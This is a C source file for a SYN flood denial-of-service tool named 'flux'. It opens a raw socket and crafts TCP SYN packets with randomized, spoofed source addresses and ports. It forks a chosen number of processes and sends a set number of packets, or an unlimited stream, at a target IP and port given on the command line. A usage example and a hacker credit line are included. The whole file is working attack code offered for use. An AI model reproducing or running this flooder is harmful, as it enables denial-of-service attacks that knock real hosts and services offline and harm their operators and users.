#include <stdio.h> 
#include <netinet/in.h> 
#include <netdb.h> 
#include <sys/time.h> 
#include <sys/types.h> 
#include <unistd.h> 
#include <stdlib.h> 
#include <signal.h> 
#include <time.h> 
void usage();                             
void getUserPriv();                        
int getSrcPort();                        
const char credit[] = "made by th3 $^N|)M^N, gr33tz to all!!!"; 
struct packet { 
  unsigned short ihl:4; 
  unsigned short ver:4;   
  unsigned char tos; 
  unsigned short len; 
  unsigned short id; 
  unsigned short flag_offset; 
  unsigned char ttl; 
  unsigned char prot; 
  unsigned short ipsum; 
  unsigned long source; 
  unsigned long dest; 
  unsigned short sport; 
  unsigned short dport; 
  unsigned long seq; 
  unsigned long ack_seq; 
  unsigned char offset; 
  unsigned char flags; 
  unsigned short win; 
  unsigned short tcpsum; 
  unsigned short urgptr; 
  char option[8];     
}; 

FILE *fp; 

main(int argc, char * argv[]){ 
   getUserPriv();        //check user priv 
  
   if (argc < 5){ 
       usage();    //exit if argument failure 
   } 
   int tmp = 1; 
   int forks = atoi(argv[3]);        
  
   /*forks defined here, depends on the number of threads user asked for.*/ 
   for (tmp = 0; tmp < forks; tmp++) fork(); 
  
   int a1,a2,a3,a4; 
   char a1s[20],a2s[20],a3s[20],a4s[20]; 
  
   /*lets open da socket and define it be raw*/ 
   int sockd = socket(PF_INET, SOCK_RAW, 6); 
  
   /*call HDRINCL and let the kernel know we do the talking :)*/ 
   if (setsockopt (sockd, IPPROTO_IP, IP_HDRINCL, (char *)&tmp, sizeof (tmp)) < 0){ 
       printf("Error in setting HDRINCL"); 
       exit(0); 
   } 
  
   /*create packet struct */ 
   struct packet synp; 
   bzero(&synp,sizeof(struct packet)); /*zero out the struct*/ 
  
   /*init sin struct*/ 
   struct sockaddr_in sin; 
  
   /*take host port and convert to unsigned short*/ 
   unsigned short hport = atoi(argv[2]); 
   int packets = atoi(argv[4]);        //number of packets 
  
   if (packets == 0) packets = -1;        //if user wants infinite, set packets to -1 
  
   int counter = 0;  //counter for the while loop. 
      
      printf("Syn Flooding: %­s at port: %­s\n", argv[1],argv[2]); 
      
      while(counter != packets){ 
       synp.ihl             = 5; 
       synp.ver         = 4; 
          synp.len             = htons(sizeof(struct packet)); 
       synp.flag_offset     = 0; 
       synp.prot           = 6; 
       synp.flags           = 2; 
       synp.ttl             = 225; 
       synp.offset          = 112; 
       synp.win             = htons(65535); 
  
          synp.dport        = htons(hport);        //destination port... 
      
       //set packet options. 
       synp.option[0]          = 2; 
       synp.option[1]          = 4; 
       synp.option[2]          = 5; 
       synp.option[3]          = 0xB4; 
       synp.option[4]          = 1; 
       synp.option[5]          = 1; 
          synp.option[6]          = 4; 
          synp.option[7]          = 2; 
      
          synp.tcpsum = 0;     //zero the sum for now... 

          register int count = (sizeof(struct packet)-20) >> 1,sum; 
           register unsigned short *p = &synp.sport;   
      
          int srcp = getSrcPort();    //generate random port. 
          
          //Generate Random Ip for src 
          a1 = (int)((rand()%(255-10+1)) + 10); 
       a2 = (int)((rand()%(255-10+1)) + 10); 
       a3 = (int)((rand()%(255-10+1)) + 10); 
       a4 = (int)((rand()%(255-10+1)) + 10); 
      
       sprintf(a1s, "%d", a1); 
       sprintf(a2s, "%d", a2); 
       sprintf(a3s, "%d", a3); 
       sprintf(a4s, "%d", a4); 
      
       strcat(a1s,"."); 
       strcat(a2s,"."); 
       strcat(a3s,"."); 
       strcat(a1s,a2s); 
       strcat(a1s,a3s); 
       strcat(a1s,a4s); 
          // 
          
          synp.sport           = htons(srcp);          //source port [RANDOMIZED] 
          synp.source            = inet_addr (a1s);       //our source address [RANDOMIZED] 
          synp.seq               = random(); 
          synp.ack_seq           = random(); 
          
          synp.id                = htons(1+255*((random()%256)|0xFF));    //random id 
      
       synp.dest = inet_addr (argv[1]); 
          
       sin.sin_family = AF_INET;          /*define internet domain*/ 
       sin.sin_port = synp.dport;          /*define dest port.*/ 
       sin.sin_addr.s_addr = synp.dest;       /*define host address*/ 
  
       /*calc header checksum*/             
           sum = (synp.source >> 16) + (synp.source & 0xffff) + (synp.dest >> 16) + 
           (synp.dest & 0xffff) + 1536 + htons(count << 1); 
          while(count--) sum += *p++; 
          sum = (sum >> 16) + (sum & 0xffff); 
          synp.tcpsum = ~(sum += (sum >> 16)); 
       // 
          
       /*Send da baby*/ 
       if (sendto (sockd,&synp,sizeof(struct packet),0,(struct sockaddr *)&sin,sizeof(struct sockaddr_in)) < 0){ 
           printf("Sendto error!"); 
           exit(0); 
       } 
      
       counter = counter + 1; 
   } 
} 

/*usage func*/ 
void usage(){ 
   printf("Usage:\n"); 
   printf("./flux ip port threads amount_of_packets(0 = max)\n"); 
   printf("./flux 111.222.333.444 80 3 500\n"); 
   exit(0); 
} 

/*user priv func, just checking for root.*/ 
void getUserPriv(){ 
   char command[80] = "whoami > priv"; 
   char command2[80] = "rm priv"; 
   char fname[30] = "priv"; 
   char user[20]; 
   system(command); 
  
   fp = fopen(fname, "r"); 
   fscanf(fp, "%­s",&user); 
   fclose(fp); 
   system(command2); 
  
   if (strcmp(user,"root") == 1){ 
       printf("Need root privelages to run...\n"); 
       exit(0); 
   } 
} 
/*random port generator func. */ 
int getSrcPort(){ 
   int  port = (rand()%(60000-2000+1)) + 2000; 
   return port; 
   }